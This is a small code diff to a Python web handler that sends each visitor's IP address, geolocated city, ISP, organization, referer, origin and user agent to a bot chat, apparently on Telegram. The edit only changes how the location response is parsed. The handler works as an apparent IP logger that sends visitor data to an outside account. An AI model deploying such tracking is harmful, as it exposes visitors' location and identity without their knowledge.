@@ -25,9 +25,9 @@ def detect_client():
     bot.send_message(CHAT_ID, f"REFERER: {request.headers.get('Referer', 'direct_access')}")
     bot.send_message(CHAT_ID, f"ORIGIN: {request.headers.get('Origin', 'no_origin')}")
     bot.send_message(CHAT_ID, f"IP: {ip}")
-    bot.send_message(CHAT_ID, f"CITY: {location['city']}")
-    bot.send_message(CHAT_ID, f"ISP: {location['isp']}")
-    bot.send_message(CHAT_ID, f"ORGANIZATION: {location['organization']}")
+    bot.send_message(CHAT_ID, f"CITY: {location.json()['city']}")
+    bot.send_message(CHAT_ID, f"ISP: {location.json()['isp']}")
+    bot.send_message(CHAT_ID, f"ORGANIZATION: {location.json()['organization']}")
     bot.send_message(CHAT_ID, f"USER_AGENT: {request.headers.get('User-Agent')}")
     
 
